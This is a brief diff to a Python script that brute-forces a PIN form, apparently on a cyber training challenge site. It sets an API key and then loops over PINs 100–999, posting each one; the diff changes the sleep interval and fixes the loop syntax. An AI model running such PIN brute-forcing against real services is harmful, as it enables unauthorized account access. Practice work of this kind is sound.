@@ -10,14 +10,14 @@ r = requests.session()
 counter = 0
 min = 100
 max = 1000
-sleep_time = 10
+sleep_time = 30
 
 #Set Session API Key
 response = r.get("http://104.cybertrial.co.uk/?mykey=" + key)
 #print("API Key Get Request Response Code: " + str(response.status_code))
 
 #for curPin in range(0, 1000):
-for i in range(start=min, end=max, step=1):
+for i in range(min, max, 1):
     payload = {"formgo": "1", "pin": str(i)}
     print("Trying pin: " + payload["pin"])
 
